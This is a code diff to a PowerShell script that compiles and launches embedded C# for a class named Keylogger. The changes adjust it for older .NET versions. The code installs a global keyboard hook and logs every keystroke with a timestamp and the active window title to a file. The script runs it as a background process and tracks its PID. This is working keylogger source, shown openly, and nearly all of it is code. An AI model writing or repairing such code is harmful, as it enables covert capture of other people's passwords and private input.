@@ -17,7 +17,7 @@ if (Test-Path $pidFile) {
     Remove-Item $pidFile -Force
 }
 
-# C# code for global keyboard hook (simplified and corrected)
+# C# code (compatible with older .NET versions)
 $cSharpCode = @"
 using System;
 using System.Diagnostics;
@@ -63,8 +63,10 @@ public class Keylogger
             if (GetWindowText(handle, buff, nChars) > 0)
                 windowTitle = buff.ToString();
 
-            string keyName = ((Keys)vkCode).ToString();
-            _writer.WriteLine($"[{DateTime.Now:HH:mm:ss}][{windowTitle}] {keyName}");
+            string keyName = ((System.Windows.Forms.Keys)vkCode).ToString();
+            // Use string.Format for compatibility
+            string line = string.Format("[{0:HH:mm:ss}][{1}] {2}", DateTime.Now, windowTitle, keyName);
+            _writer.WriteLine(line);
         }
         return CallNextHookEx(_hookID, nCode, wParam, lParam);
     }
@@ -97,7 +99,7 @@ public class Keylogger
 }
 "@
 
-# Save C# code to a temporary file for compilation
+# Save C# code to a temporary file
 $cSharpCode | Out-File -FilePath $csharpFile -Encoding utf8
 
 # PowerShell script to compile and run
@@ -139,7 +141,6 @@ if ($p.HasExited) {
     } else {
         Write-Output "Keylogger process exited unexpectedly with no error log."
     }
-    # Clean up
     Remove-Item $csharpFile -Force -ErrorAction SilentlyContinue
 } else {
     $p.Id | Out-File -FilePath $pidFile -Force
